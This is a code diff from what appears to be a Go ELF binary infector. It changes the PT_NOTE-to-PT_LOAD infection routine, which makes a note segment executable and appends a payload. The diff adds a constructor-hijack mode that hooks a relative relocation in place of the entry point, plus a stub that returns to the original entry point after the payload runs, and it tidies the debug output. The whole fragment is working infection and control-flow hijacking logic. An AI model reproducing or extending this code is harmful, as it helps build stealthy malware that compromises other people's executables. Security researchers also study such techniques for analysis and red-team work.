@@ -9,7 +9,7 @@ import (
 	"io/ioutil"
 )
 
-func (t *TargetBin) PtNoteToPtLoadInfection(opts InfectOpts, debug bool) error {
+func (t *TargetBin) PtNoteToPtLoadInfection(opts InfectOpts) error {
 	var noteNdx int
 
 	switch t.EIdent.Arch {
@@ -28,51 +28,60 @@ func (t *TargetBin) PtNoteToPtLoadInfection(opts InfectOpts, debug bool) error {
 			}
 		}
 
-		if debug {
-			fmt.Printf("[+] PT_NOTE segment pHeader index @ %d\n", noteNdx)
-		}
-
-		if debug {
-			fmt.Println("[+] Converting PT_NOTE to PT_LOAD and setting PERM R-X")
-		}
+		t.printDebugMsg("[+] PT_NOTE segment pHeader index @ %d\n", noteNdx)
+		t.printDebugMsg("[+] Converting PT_NOTE to PT_LOAD and setting PERM R-X")
 
 		t.Phdrs.([]elf.Prog64)[noteNdx].Type = uint32(elf.PT_LOAD)
 		t.Phdrs.([]elf.Prog64)[noteNdx].Flags = uint32(elf.PF_R | elf.PF_X)
 		t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr = 0xc000000 + uint64(t.Filesz)
 		t.Phdrs.([]elf.Prog64)[noteNdx].Off = uint64(t.Filesz)
 
-		if debug {
-			fmt.Printf("[+] Newly created PT_LOAD virtual address starts at 0x%x\n", t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr)
-		}
+		t.printDebugMsg("[+] Newly created PT_LOAD virtual address starts at 0x%x\n", t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr)
+		
+		newEntry := t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr
 
-		t.Hdr.(*elf.Header64).Entry = t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr
-
-		if debug {
-			fmt.Printf("[+] Modifed entry point from 0x%x to 0x%x\n", oEntry, t.Hdr.(*elf.Header64).Entry)
+		var origAddend int64
+		var relocEntry elf.Rela64
+		if (opts & CtorsHijack) == CtorsHijack {
+			if err := t.relativeRelocHook(&origAddend, &relocEntry, int64(newEntry)); err != nil {
+				return err
+			}
+			
+		}else {
+			t.Hdr.(*elf.Header64).Entry = newEntry 
 		}
+		
+		t.printDebugMsg("[+] Modifed entry point from 0x%x to 0x%x\n", oEntry, t.Hdr.(*elf.Header64).Entry)
 
 		if !((opts & NoRest) == NoRest) {
 			t.Payload.Write(restoration64)
 		}
-
+		
+		if !((opts & NoRetOEP) == NoRetOEP) {
+			var retStub []byte
+			if (opts & CtorsHijack) == CtorsHijack {
+				retStub = modEpilogue(int32(t.Payload.Len() + 5), uint64(relocEntry.Addend), uint64(origAddend))
+			}else {
+				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry)
+			}
+			t.Payload.Write(retStub)
+		}
+		
+		/*
 		if !((opts & NoRetOEP) == NoRetOEP) {
 			retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
 			t.Payload.Write(retStub)
 		}
-
+		*/
+		
 		plen := uint64(t.Payload.Len())
 
 		t.Phdrs.([]elf.Prog64)[noteNdx].Filesz += plen
 		t.Phdrs.([]elf.Prog64)[noteNdx].Memsz += plen
 
-		if debug {
-			fmt.Printf("[+] Increased Phdr.Filesz by length of payload (0x%x)\n", plen)
-			fmt.Printf("[+] Increased Phdr.Memsz by length of payload (0x%x)\n", plen)
-		}
-
-		if debug {
-			fmt.Printf("[+] Increased section header offset from 0x%x to 0x%x to account for payload\n", (t.Hdr.(*elf.Header64).Shoff - plen), t.Hdr.(*elf.Header64).Shoff)
-		}
+		t.printDebugMsg("[+] Increased Phdr.Filesz by length of payload (0x%x)\n", plen)
+		t.printDebugMsg("[+] Increased Phdr.Memsz by length of payload (0x%x)\n", plen)
+		t.printDebugMsg("[+] Increased section header offset from 0x%x to 0x%x to account for payload\n", (t.Hdr.(*elf.Header64).Shoff - plen), t.Hdr.(*elf.Header64).Shoff)
 
 	case elf.ELFCLASS32:
 		return errors.New("32 bit support for this alogorithm is not implemented yet")
